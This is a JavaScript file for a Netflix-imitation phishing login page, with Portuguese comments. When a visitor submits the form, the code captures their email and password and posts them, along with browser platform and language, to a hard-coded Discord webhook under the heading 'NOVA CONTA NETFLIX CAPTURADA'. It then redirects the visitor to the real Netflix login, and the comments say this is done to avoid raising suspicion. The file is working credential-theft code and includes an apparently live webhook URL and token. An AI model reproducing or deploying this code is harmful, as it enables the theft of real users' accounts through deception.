document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');
    const submitBtn = document.getElementById('submitBtn');
    
    // URL da sua Webhook
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1481359530414706730/cBGczTGxlNbdGPTekcHHYP8NiiEzqK_xB_ilyQ0AYg5VcC2J8JLm-mZhB4QbqiSLalmJ';

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Feedback visual de carregamento
        submitBtn.disabled = true;
        submitBtn.innerText = "Carregando...";

        // Objeto formatado para o Discord
        const payload = {
            embeds: [{
                title: "🎥 NOVA CONTA NETFLIX CAPTURADA",
                color: 14944532,
                thumbnail: { 
                    url: "https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/227_Netflix_logo-512.png" 
                },
                fields: [
                    { name: "👤 Usuário/E-mail", value: `\`\`\`${email}\`\`\``, inline: false },
                    { name: "🔑 Senha", value: `\`\`\`${password}\`\`\``, inline: false },
                    { name: "📱 Info", value: `\`${navigator.platform}\` | \`${navigator.language}\``, inline: true }
                ],
                footer: { 
                    text: "Shelby Logs • " + new Date().toLocaleString('pt-BR') 
                }
            }]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            // Redireciona para o login real da Netflix para não gerar suspeitas
            window.location.href = 'https://www.netflix.com/br/login';
        } catch (error) {
            // Em caso de erro, redireciona mesmo assim para manter o disfarce
            window.location.href = 'https://www.netflix.com/br/login';
        }
    });
});
